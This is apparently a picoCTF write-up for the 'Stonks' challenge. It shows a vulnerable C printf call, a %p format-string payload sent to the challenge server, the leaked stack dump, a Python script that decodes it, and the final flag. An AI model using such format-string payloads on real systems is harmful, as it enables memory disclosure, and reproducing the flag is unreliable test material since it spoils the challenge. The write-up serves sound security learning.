# Stonks

## Description
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/62f47b5b65ec7eadb96c4e34f016f68d/vuln.c) `nc mercury.picoctf.net 53437`

## Hints
Okay, maybe I'd believe you if you find my API key.

![Screen Shot 2022-06-12 at 20 25 23](https://user-images.githubusercontent.com/83420725/173235421-61966e97-fcf0-4406-8be0-d4fe249a9652.png)


```c
char *user_buf = malloc(300 + 1);
printf("What is your API token?\n");
scanf("%300s", user_buf);
printf("Buying stonks with token:\n");
printf(user_buf);
```
> Notice the `printf(user_buf);`
    
    Welcome back to the trading app!
    What would you like to do?
    1) Buy some stonks!
    2) View my portfolio
    1
    Using patented AI algorithms to buy stonks
    Stonks chosen
    What is your API token?
    %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
    Buying stonks with token:
    0x8f083900x804b0000x80489c30xf7f57d800xffffffff0x10x8f061600xf7f651100xf7f57dc7(nil)0x8f071800x30x8f083700x8f083900x6f6369700x7b4654430x306c5f490x345f74350x6d5f6c6c0x306d5f790x5f79336e0x346364620x616535320xffcc007d
    Portfolio as of Sun Jun 12 13:41:41 UTC 2022

    3 shares of EFSK
    1 shares of PRH
    7 shares of BB
    32 shares of PLA
    133 shares of CTB
    Goodbye!

The hex string that i receive

    0x8f083900x804b0000x80489c30xf7f57d800xffffffff0x10x8f061600xf7f651100xf7f57dc7(nil)0x8f071800x30x8f083700x8f083900x6f6369700x7b4654430x306c5f490x345f74350x6d5f6c6c0x306d5f790x5f79336e0x346364620x616535320xffcc007d
Decode the string after `nil` and I have the string look like:

    7¹Socip{FTC0l_I4_t5m_ll0m_y_y3n4cdbae52ÿ½}

Script get flag:
```python 
flag = "ocip{FTC0l_I4_t5m_ll0m_y_y3n4cdbae52ÿ½�}"
temp = ''
result = ''
for i in range(0, len(flag), 4):
    temp = flag[i:i+4]
    result += temp[::-1]
print (result)
   
```

> picoCTF{I_l05t_4ll_my_m0n3y_bdc425ea}
